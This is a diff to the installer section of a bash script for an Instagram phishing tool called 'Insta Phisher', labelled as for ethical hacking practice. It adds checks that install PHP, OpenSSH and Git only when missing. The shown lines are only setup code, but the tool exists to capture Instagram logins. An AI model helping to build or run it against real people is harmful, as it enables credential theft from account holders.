@@ -16,9 +16,37 @@ figlet "Insta Phisher" | lolcat
 echo -e "${GRN}Instagram Phishing Tool for Ethical Hacking Practice${NC}"
 echo -e "Created by: SACHIN BADASRA\n"
 
-echo -e "${GRN}[+] Installing requirements...${NC}"
-pkg update -y > /dev/null 2>&1
-pkg install php openssh git -y > /dev/null 2>&1
+# Colors
+GRN='\033[0;32m'
+NC='\033[0m'
+
+# Check if requirements already installed
+if [ -f "$HOME/.mytool_installed" ]; then
+    echo -e "${GRN}[*] Requirements already installed. Skipping setup...${NC}"
+else
+    echo -e "${GRN}[+] Installing requirements...${NC}"
+    
+    pkg update -y > /dev/null 2>&1
+
+    # Install PHP if not installed
+    if ! command -v php > /dev/null 2>&1; then
+        pkg install php -y > /dev/null 2>&1
+    fi
+
+    # Install OpenSSH if not installed
+    if ! command -v ssh > /dev/null 2>&1; then
+        pkg install openssh -y > /dev/null 2>&1
+    fi
+
+    # Install Git if not installed
+    if ! command -v git > /dev/null 2>&1; then
+        pkg install git -y > /dev/null 2>&1
+    fi
+
+    # Create a flag file to mark setup done
+    touch "$HOME/.mytool_installed"
+    echo -e "${GRN}[+] Requirements installation complete.${NC}"
+fi
 
 # Start PHP server
 start_localhost() {
